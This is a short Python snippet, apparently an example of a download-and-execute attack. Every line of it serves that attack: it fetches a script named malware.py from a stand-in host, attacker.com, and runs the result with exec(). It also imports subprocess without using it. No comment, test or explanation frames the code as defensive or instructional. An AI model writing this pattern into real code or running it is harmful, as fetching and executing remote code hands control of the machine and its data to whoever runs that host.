import urllib.request
import subprocess

url = "http://attacker.com/malware.py"
code = urllib.request.urlopen(url).read().decode()
exec(code)
